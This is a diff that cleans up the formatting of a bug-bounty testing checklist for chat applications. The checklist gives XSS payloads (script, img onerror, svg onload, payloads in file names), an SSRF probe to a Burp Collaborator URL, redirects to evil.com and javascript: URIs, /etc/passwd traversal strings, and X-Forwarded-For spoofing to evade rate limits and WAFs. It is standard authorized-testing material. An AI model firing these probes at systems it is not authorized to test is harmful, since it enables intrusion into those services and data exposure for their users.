@@ -15,7 +15,8 @@ Identify:
 
 - Capture full chat API request using Burp Suite or ZAP
 
-# 🐞 2️⃣ Vulnerability Classes & Payloads
+#  Vulnerability Classes & Payloads
+
 A. Stored XSS in Messages
 -----Basic Payloads----
 
@@ -29,50 +30,31 @@ A. Stored XSS in Messages
 "><img src=x onerror=alert(1)>
 "><iframe src=javascript:alert(1)>
   
-Unicode Based
+-----Unicode Based------
 
 &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
-HTML Encoding
 
-html
-Copy
-Edit
+-----HTML Encoding------
+
 &lt;script&gt;alert(1)&lt;/script&gt;
-Double Encoded
 
-html
-Copy
-Edit
+----Double Encoded-----
+
 %3Cscript%3Ealert(1)%3C%2Fscript%3E
-CSS Injection
 
-css
-Copy
-Edit
+------CSS Injection-------
+
 <style>@import 'javascript:alert(1)';</style>
+
 B. Stored XSS via File Upload
 Test Points:
 File name:
-
-bash
-Copy
-Edit
 "><script>alert(1)</script>.pdf
 test"><img src=x onerror=alert(1)>.png
-PDF Metadata:
-
-Title
-
-Author
-
-Subject
+PDF Metadata: Title, Author, Subject
 
 Malicious Files:
 SVG file (high chance of XSS)
-
-xml
-Copy
-Edit
 
 Polyglot Files (.html disguised as .pdf, .docx etc.)
 
@@ -83,20 +65,12 @@ Observe if backend parses content.
 
 C. SSRF via Chatbot External Links
 Payload:
-
-cpp
-Copy
-Edit
 http://<your-burpcollaborator-url>
-Headers to manipulate:
 
-Host
+# Headers to manipulate:
+Host, Origin, Referer
 
-Origin
-
-Referer
-
-Test for:
+# Test for:
 
 Outbound DNS/HTTP requests
 
@@ -104,10 +78,6 @@ Internal network SSRF
 
 D. Open Redirect via Message Hyperlinks
 Payload:
-
-javascript
-Copy
-Edit
 https://evil.com
 javascript:alert(1)
 data:text/html,<script>alert(1)</script>
@@ -118,11 +88,8 @@ Redirect links are sanitized.
 Embedded protocols are allowed (javascript: / data:).
 
 E. Directory Traversal via File Upload
-Payloads:
 
-perl
-Copy
-Edit
+Payloads:
 ../../../../etc/passwd
 ..%2f..%2f..%2f..%2fetc/passwd
 F. Rate Limiting Bypass
@@ -131,21 +98,14 @@ Use Burp Intruder to brute force chat API
 Headers to manipulate:
 
 X-Forwarded-For
-
 True-Client-IP
-
 CF-Connecting-IP
-
 Forwarded: for=127.0.0.1
 
-Randomize IPs to bypass WAF/CDN limits
+# Randomize IPs to bypass WAF/CDN limits
 
-bash
-Copy
-Edit
 X-Forwarded-For: 127.0.0.1, 8.8.8.8
 Try:
-
 Removing Cookies
 
 Changing User-Agent
@@ -153,32 +113,22 @@ Changing User-Agent
 G. CORS Misconfiguration
 Test using Burp Collaborator:
 
-Add header:
-
-arduino
-Copy
-Edit
+# Add header:
 Origin: https://evil.com
 Observe if:
-
 Access-Control-Allow-Origin: *
-
 Sensitive data returned
 
 H. IDOR (Insecure Direct Object Reference)
-Capture file upload response IDs:
+# Capture file upload response IDs:
 
-bash
-Copy
-Edit
 https://chat.site.com/file-upload/abc123/file.pdf
-Attempt accessing nearby IDs:
 
-nginx
-Copy
-Edit
+# Attempt accessing nearby IDs:
+
 abc124
 abc125
+
 Check whether authentication is enforced on file access.
 
 I. DOM Based XSS
@@ -186,12 +136,10 @@ Observe chat UI JavaScript code using DevTools.
 
 Inject payloads into message text to trigger client-side reflections.
 
-Payload:
+# Payload:
 
-bash
-Copy
-Edit
 "><svg/onload=alert(1)>
+
 J. Logic Bugs
 Abuse chatbot workflows:
 
@@ -205,7 +153,7 @@ Send invalid JSON.
 
 Observe error behavior.
 
-🚀 3️⃣ Automation Tips
+# Automation Tips
 Use Burp Intruder for mass-fuzzing.
 
 Use FFUF for file ID enumeration.
@@ -219,9 +167,6 @@ Use Corsy for automated CORS testing.
 📈 4️⃣ Reporting Template
 Whenever you find something, you can follow this template for easy reporting:
 
-markdown
-Copy
-Edit
 Title: Stored XSS via Chatbot File Upload
 
 Summary:
@@ -241,4 +186,6 @@ Impact:
 - Session hijacking
 
 Severity: High
+
+
 ✅ DONE.
